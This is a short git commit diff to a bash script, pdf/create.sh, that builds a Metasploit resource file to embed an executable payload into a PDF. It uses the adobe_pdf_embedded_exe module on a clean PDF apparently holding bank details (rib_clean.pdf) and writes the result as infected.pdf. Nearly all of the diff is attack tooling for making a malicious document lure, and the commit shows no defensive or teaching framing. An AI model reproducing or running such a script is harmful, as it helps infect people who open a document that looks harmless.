e07b39d9a5ac81705901bb2ce11101e726d2ece9
Couscouz <rem.couzi@gmail.com>
2025-03-23 13:56:32 +0100

    temp

--- pdf/create.sh
+++ pdf/create.sh
@@ -1,17 +1,16 @@
 #!/bin/bash
 
-PDF_ORIGINAL="pdf/rib.pdf"
-EXE_PAYLOAD="pdf/payload.exe"
-OUTPUT_DIR="pdf/output"
-OUTPUT_NAME="infected.pdf"
 
-SCRIPT_FILE="pdf/pdf_payload.rc"
+PDF_ORIGINAL="pdf/rib_clean.pdf"
+EXE_PAYLOAD="pdf/payload.exe"
+OUTPUT_NAME="pdf/output/infected.pdf"
+
+SCRIPT_FILE="pdf/msf_generator.rc"
 
 echo "use exploit/windows/fileformat/adobe_pdf_embedded_exe" > $SCRIPT_FILE
 echo "set FILENAME $OUTPUT_NAME" >> $SCRIPT_FILE
 echo "set INFILENAME $PDF_ORIGINAL" >> $SCRIPT_FILE
-echo "set EXENAME $EXE_PAYLOAD" >> $SCRIPT_FILE
-echo "set OUTPUTPATH $OUTPUT_DIR" >> $SCRIPT_FILE
+echo "set EXE::CUSTOM $EXE_PAYLOAD" >> $SCRIPT_FILE
 echo "exploit" >> $SCRIPT_FILE
 echo "exit" >> $SCRIPT_FILE
 
